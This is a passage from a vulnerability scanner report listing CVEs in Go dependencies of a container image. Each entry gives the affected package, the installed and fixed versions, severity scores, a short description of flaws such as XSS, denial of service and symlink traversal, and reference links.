│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-25680 
│     │      │                  ├ [1]: https://go.dev/cl/781702 
│     │      │                  ├ [2]: https://go.dev/issue/79573 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-25680 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5028 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-25680 
│     │      ├ PublishedDate   : 2026-05-22T16:16:19.753Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [11] ╭ VulnerabilityID : CVE-2026-42502 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5027 
│     │      ├ PkgID           : golang.org/x/net@v0.51.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.51.0 
│     │      │                  ╰ UID : 5e89717fe2a26868 
│     │      ├ InstalledVersion: v0.51.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42502 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:164577a5d61c83d8843eb92764fede69d19c6d7856e6d06f80a28f1a6e68441e 
│     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
│     │      │                    unexpected HTML tree rendering 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-1021 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                           ╰ V3Score : 6.1 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42502 
│     │      │                  ├ [1]: https://go.dev/cl/781701 
│     │      │                  ├ [2]: https://go.dev/issue/79572 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42502 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5027 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42502 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.587Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [12] ╭ VulnerabilityID : CVE-2026-42506 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5025 
│     │      ├ PkgID           : golang.org/x/net@v0.51.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.51.0 
│     │      │                  ╰ UID : 5e89717fe2a26868 
│     │      ├ InstalledVersion: v0.51.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42506 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:03e4e3d296f452dd76483afadba198430435338059397cbd25a8c4894f319c7d 
│     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Cross-Site Scripting (XSS) via
│     │      │                   arbitrary HTML parsing 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                           ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42506 
│     │      │                  ├ [1]: https://go.dev/cl/781700 
│     │      │                  ├ [2]: https://go.dev/issue/79571 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42506 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5025 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42506 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.803Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [13] ╭ VulnerabilityID : CVE-2026-46600 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5942 
│     │      ├ PkgID           : golang.org/x/net@v0.51.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.51.0 
│     │      │                  ╰ UID : 5e89717fe2a26868 
│     │      ├ InstalledVersion: v0.51.0 
│     │      ├ FixedVersion    : 0.56.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:f24d4a6251dd789511f7c4cd1da621d83ffc485e4b37a7465dc269c7f580a8fc 
│     │      ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ... 
│     │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter
│     │      │                   value overflows the message buffer. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ CweIDs           ─ [0]: CWE-125 
│     │      ├ References       ╭ [0]: https://go.dev/cl/786345 
│     │      │                  ├ [1]: https://go.dev/issue/79795 
│     │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
│     │      ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
│     │      ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│     ├ [14] ╭ VulnerabilityID : CVE-2026-39824 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5024 
│     │      ├ PkgID           : golang.org/x/sys@v0.42.0 
│     │      ├ PkgName         : golang.org/x/sys 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/sys@v0.42.0 
│     │      │                  ╰ UID : 4ffcb4cbb21a770c 
│     │      ├ InstalledVersion: v0.42.0 
│     │      ├ FixedVersion    : 0.44.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39824 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:9dda512a4b59acdc8fc466e0902b1650f1b30650d79f0f2239f82490ea095bb7 
│     │      ├ Title           : Invoking integer overflow in NewNTUnicodeString in golang.org/x/sys/windows 
│     │      ├ Description     : NewNTUnicodeString does not check for string length overflow. When provided
│     │      │                   with a string that overflows the maximum size of a NTUnicodeString (a 16-bit
│     │      │                   number of bytes), it returns a truncated string rather than an error. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ CweIDs           ─ [0]: CWE-190 
│     │      ├ References       ╭ [0]: https://go.dev/cl/770080 
│     │      │                  ├ [1]: https://go.dev/issue/78916 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/6MMI8Lj-Atg 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5024 
│     │      ├ PublishedDate   : 2026-05-22T20:16:33.057Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [15] ╭ VulnerabilityID : CVE-2026-56852 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5970 
│     │      ├ PkgID           : golang.org/x/text@v0.35.0 
│     │      ├ PkgName         : golang.org/x/text 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.35.0 
│     │      │                  ╰ UID : a9f39cf56d190707 
│     │      ├ InstalledVersion: v0.35.0 
│     │      ├ FixedVersion    : 0.39.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:c05dbf416feab9a29c5cf4758dc1fe0e00daf4a4cac1c328a9fd78f803fe792b 
│     │      ├ Title           : A norm.Iter can enter an infinite loop when handling input containing  ... 
│     │      ├ Description     : A norm.Iter can enter an infinite loop when handling input containing invalid
│     │      │                   UTF-8 bytes. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ CweIDs           ─ [0]: CWE-835 
│     │      ├ References       ╭ [0]: https://go.dev/cl/794100 
│     │      │                  ├ [1]: https://go.dev/issue/80142 
│     │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
│     │      ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│     │      ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│     ├ [16] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
│     │      ├ PkgID           : google.golang.org/grpc@v1.80.0 
│     │      ├ PkgName         : google.golang.org/grpc 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.80.0 
│     │      │                  ╰ UID : 62bc4e817051b9c0 
│     │      ├ InstalledVersion: v1.80.0 
│     │      ├ FixedVersion    : 1.82.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:23ed2ee419e7f6f0ab383366d6dc5795801a21ec6a70534b2250d65adb668d49 
│     │      ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
│     │      ├ Description     : Multiple security vulnerabilities have been identified and addressed in
│     │      │                   grpc-go affecting the xDS RBAC authorization engine (internal/xds/rbac) and
│     │      │                   the HTTP/2 transport server implementation (internal/transport). These
│     │      │                   vulnerabilities could result in:
│     │      │                   
│     │      │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC policies
│     │      │                   containing `Metadata` or `RequestedServerName` fields.
│     │      │                   - Denial of Service (High CPU Consumption) due to an HTTP/2 Rapid Reset
│     │      │                   mitigation bypass during client-initiated stream resets.
│     │      │                   - Denial of Service (Server Panic) when parsing crafted xDS RBAC policies
│     │      │                   containing `NOT` rules around unsupported fields.
│     │      │                   ### Impact
│     │      │                   _What kind of vulnerability is it? Who is impacted?_
│     │      │                   #### xDS RBAC Authorization Bypass via `Metadata` & `RequestedServerName`
│     │      │                   matchers
│     │      │                   - Affected Component: xDS RBAC 
│     │      │                   - Impact: When building policy matchers for gRPC RBAC from xDS configurations,
│     │      │                    unsupported `permission` and `principal` rules (specifically `Metadata` and
│     │      │                   `RequestedServerName`) were silently ignored and treated as no-ops.
│     │      │                     - If an authorization policy relied purely on these matchers for access
│     │      │                   control, treating those rules as no-ops effectively removed the restrictions.
│     │      │                   - If these unsupported rules were nested inside logical `NOT` rules
│     │      │                   (`Permission_NotRule` / `Principal_NotId`) or multi-condition `OR/AND` rules,
│     │      │                   silently dropping them changed the boolean logic flow of the authorization
│     │      │                   engine.
│     │      │                   As a result, policy evaluation decisions could fail open, allowing
│     │      │                   unauthorized clients to access protected gRPC services or resources.
│     │      │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service via Stream
│     │      │                   Aborts
│     │      │                   - Affected Component: HTTP/2 transport
│     │      │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid Reset only applied
│     │      │                   threshold checks to items that directly resulted in control frames being
│     │      │                   written back to the wire, such as `SETTINGS` ACKs or server-initiated
│     │      │                   `RST_STREAM`s.
│     │      │                   When a client initiated a rapid flood of stream creation (`HEADERS`)
│     │      │                   immediately followed by stream termination `RST_STREAM`, items queued up in
│     │      │                   the control buffer without counting against the transport response frame
│     │      │                   threshold. An attacker can repeatedly trigger this flood sequence to bypass
│     │      │                   reader blocking, resulting in high CPU usage, and Denial of Service (DoS).
│     │      │                   #### Denial of Service (Panic) in xDS RBAC Engine via Unsupported Fields
│     │      │                   inside NOT Rules
│     │      │                   - Impact: The xDS RBAC policy translators recursively generate matchers for
│     │      │                   nested rules. When a `NOT` rule wrapped an unsupported or unhandled field
│     │      │                   (such as `SourcedMetadata`), the recursive step returned an empty matcher.
│     │      │                   This could result in a runtime panic when the RBAC engine attempts to
│     │      │                   authorize an incoming request.
│     │      │                   An attacker or misconfigured/malicious xDS management server delivering an
│     │      │                   LDS/RDS update containing a `NOT` rule around an unhandled field causes the
│     │      │                   gRPC server process to crash immediately (CWE-248 / Denial of Service).
│     │      │                   ### Patches
│     │      │                   _Has the problem been patched? What versions should users upgrade to?_
│     │      │                   All three issues have been fixed in `master` and will be released in 1.82.1
│     │      │                   shortly.
│     │      │                   ### Workarounds
│     │      │                   _Is there a way for users to fix or remediate the vulnerability without
│     │      │                   upgrading?_
│     │      │                   If upgrading grpc-go immediately is not possible, apply the following
│     │      │                   workarounds based on your deployment architecture:
│     │      │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream xDS management
│     │      │                   servers do not push RBAC policies containing `Metadata`,
│     │      │                   `RequestedServerName`, or `NOT` rules wrapping unsupported fields (such as
│     │      │                   `SourcedMetadata`) to grpc-go servers.
│     │      │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse proxies or load
│     │      │                   balancers (such as Envoy) with strict HTTP/2 `max_concurrent_streams` limits
│     │      │                   and active rate limiting on `RST_STREAM` frequency per connection.
│     │      │                   ### Severity
│     │      │                     | Vulnerability | Qualitative Severity | Approximate CVSS v3.1 Score |
│     │      │                   Primary Impact |
│     │      │                     | :--- | :--- | :--- | :--- |
│     │      │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` | Unauthorized Access
│     │      │                    / Fail-Open |
│     │      │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` | High CPU
│     │      │                   Consumption / Denial of Service |
│     │      │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` | Process Crash /
│     │      │                   Denial of Service | 
│     │      ├ Severity        : HIGH 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/
│     │      │                         │            SA:N 
│     │      │                         ╰ V40Score : 8.8 
│     │      ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
│     │      │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f72a142fe0fc89c197
│     │      │                  │      70b2935 
│     │      │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
│     │      │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
│     │      │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHSA-hrxh-6v49-42gf 
│     │      ├ PublishedDate   : 2026-07-21T22:03:55Z 
│     │      ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
│     ├ [17] ╭ VulnerabilityID : CVE-2026-27145 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5037 
│     │      ├ PkgID           : stdlib@v1.26.3 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│     │      │                  ╰ UID : d70a4c65b1ff5c43 
│     │      ├ InstalledVersion: v1.26.3 
│     │      ├ FixedVersion    : 1.25.11, 1.26.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:1abc066a4a19fc04c722884343673f4e0f68f0322514af52b5e49505969d8b45 
│     │      ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service via excessive
│     │      │                   processing of DNS SAN entries 
│     │      ├ Description     : (*x509.Certificate).VerifyHostname previously called matchHostnames in a loop
│     │      │                   over all DNS Subject Alternative Name (SAN) entries. This caused
│     │      │                   strings.Split(host, ".") to execute repeatedly on the same input hostname.
│     │      │                   With a large DNS SAN list, verification costs scaled quadratically based on
│     │      │                   the number of SAN entries multiplied by the hostname's label count. Because
│     │      │                   x509.Verify validates hostnames before building the certificate chain, this
│     │      │                   overhead occurred even for untrusted certificates. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-606 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 2 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:H 
│     │      │                  │         ╰ V3Score : 6.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:29981 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33574 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:34357 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:34359 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:35832 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36317 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:38995 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:39005 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:39573 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:39879 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:41030 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:41930 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:42043 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42047 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:42049 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:42050 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42051 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42079 
│     │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:42080 
│     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:42082 
│     │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:42142 
│     │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:42150 
│     │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:42151 
│     │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:42240 
│     │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42946 
│     │      │                  ├ [31]: https://access.redhat.com/security/cve/CVE-2026-27145 
│     │      │                  ├ [32]: https://bugzilla.redhat.com/2445356 
│     │      │                  ├ [33]: https://bugzilla.redhat.com/2484207 
│     │      │                  ├ [34]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
│     │      │                  ├ [35]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│     │      │                  ├ [36]: https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│     │      │                  ├ [37]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
│     │      │                  ├ [38]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
│     │      │                  ├ [39]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
│     │      │                  ├ [40]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
│     │      │                  ├ [41]: https://errata.rockylinux.org/RLSA-2026:38995 
│     │      │                  ├ [42]: https://go.dev/cl/783621 
│     │      │                  ├ [43]: https://go.dev/issue/79694 
│     │      │                  ├ [44]: https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│     │      │                  ├ [45]: https://linux.oracle.com/cve/CVE-2026-27145.html 
│     │      │                  ├ [46]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
│     │      │                  ├ [47]: https://nvd.nist.gov/vuln/detail/CVE-2026-27145 
│     │      │                  ├ [48]: https://pkg.go.dev/vuln/GO-2026-5037 
│     │      │                  ├ [49]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-27145
│     │      │                  │       .json 
│     │      │                  ╰ [50]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
│     │      ├ PublishedDate   : 2026-06-02T23:16:35.57Z 
│     │      ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
│     ├ [18] ╭ VulnerabilityID : CVE-2026-39822 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4970 
│     │      ├ PkgID           : stdlib@v1.26.3 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│     │      │                  ╰ UID : d70a4c65b1ff5c43 
│     │      ├ InstalledVersion: v1.26.3 
│     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:8d431d31bf3d6656cdfc8023a812ab98d8fcc0b0584cde4d5496adb3970b6703 
│     │      ├ Title           : os: golang: Go os.Root: Symlink following vulnerability allows directory
│     │      │                   traversal 
│     │      ├ Description     : On Unix systems, opening a file in an os.Root improperly follows symlinks to
│     │      │                   locations outside of the Root when the final path component of the a path is a
│     │      │                    symbolic link and the path ends in /. For example, 'root.Open("symlink/")'
│     │      │                   will open "symlink" even when "symlink" is a symbolic link pointing outside of
│     │      │                    the root. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-61 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 2 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 7.8 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                            ╰ V3Score : 7.8 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2498152 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│     │      │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
│     │      │                  ├ [7] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
│     │      │                  ├ [9] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
│     │      │                  ├ [10]: https://errata.rockylinux.org/RLSA-2026:38995 
│     │      │                  ├ [11]: https://go.dev/cl/797880 
│     │      │                  ├ [12]: https://go.dev/issue/79005 
│     │      │                  ├ [13]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc 
│     │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-39822.html 
│     │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
│     │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-39822 
│     │      │                  ├ [17]: https://pkg.go.dev/vuln/GO-2026-4970 
│     │      │                  ╰ [18]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
│     │      ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
│     │      ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
│     ├ [19] ╭ VulnerabilityID : CVE-2026-42504 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5038 
│     │      ├ PkgID           : stdlib@v1.26.3 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│     │      │                  ╰ UID : d70a4c65b1ff5c43 
│     │      ├ InstalledVersion: v1.26.3 
│     │      ├ FixedVersion    : 1.25.11, 1.26.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:36f295a7fa806d850c5351a52850e00900756356a607140fa30b457f4c51c7f7 
│     │      ├ Title           : mime: golang: Golang MIME: Denial of Service via maliciously-crafted MIME header 
